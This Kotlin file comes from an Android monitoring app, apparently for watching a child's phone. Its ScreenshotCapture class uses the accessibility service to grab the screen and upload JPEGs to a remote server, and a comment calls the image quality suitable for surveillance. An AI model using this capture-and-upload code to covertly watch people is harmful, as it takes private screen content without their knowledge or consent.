package com.monitor.child.screenshot

import android.accessibilityservice.AccessibilityService
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import com.monitor.child.data.PreferencesManager
import com.monitor.child.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executor

/**
 * Captura la pantalla usando AccessibilityService.takeScreenshot() (API 30+).
 *
 * Llamar desde MessageCaptureService para usar el contexto del AccessibilityService.
 * El resultado se sube directamente a /api/screenshots/upload.
 */
class ScreenshotCapture(
    private val service: AccessibilityService,
    private val apiClient: ApiClient,
    private val prefs: PreferencesManager,
    private val scope: CoroutineScope,
) {
    companion object {
        private const val TAG = "ScreenshotCapture"
        private const val JPEG_QUALITY = 70  // Calidad suficiente para vigilancia
    }

    /**
     * Solicita una captura asíncrona.
     * Solo disponible en Android 11 (API 30)+.
     */
    fun capture() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.d(TAG, "takeScreenshot() no disponible — requiere API 30+")
            return
        }

        val executor: Executor = Executor { command -> scope.launch { command.run() } }

        @Suppress("NewApi")
        service.takeScreenshot(
            0, // displayId 0 = pantalla principal
            executor,
            object : AccessibilityService.TakeScreenshotCallback {
                override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                    scope.launch {
                        processAndUpload(result)
                    }
                }

                override fun onFailure(errorCode: Int) {
                    Log.w(TAG, "takeScreenshot falló: errorCode=$errorCode")
                }
            }
        )
    }

    @Suppress("NewApi")
    private suspend fun processAndUpload(result: AccessibilityService.ScreenshotResult) {
        try {
            val hardwareBuffer = result.hardwareBuffer ?: return
            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, null) ?: return
            hardwareBuffer.close()

            // Convertir a JPEG
            val baos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos)
            bitmap.recycle()
            val jpegBytes = baos.toByteArray()

            uploadScreenshot(jpegBytes)
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando captura: ${e.message}")
        }
    }

    private suspend fun uploadScreenshot(jpegBytes: ByteArray) = withContext(Dispatchers.IO) {
        val deviceId = prefs.getDeviceId() ?: return@withContext
        val token = prefs.getDeviceToken() ?: return@withContext
        val serverUrl = prefs.getServerUrl()

        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("deviceId", deviceId)
                .addFormDataPart(
                    "file",
                    "${System.currentTimeMillis()}.jpg",
                    jpegBytes.toRequestBody("image/jpeg".toMediaType()),
                )
                .build()

            val request = Request.Builder()
                .url("$serverUrl/api/screenshots/upload")
                .header("Authorization", "Bearer $token")
                .post(requestBody)
                .build()

            val response = apiClient.getHttpClient().newCall(request).execute()
            if (response.isSuccessful) {
                Log.d(TAG, "Captura subida (${jpegBytes.size / 1024}KB)")
            } else {
                Log.w(TAG, "Error subiendo captura: ${response.code}")
            }
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error en uploadScreenshot: ${e.message}")
        }
    }
}
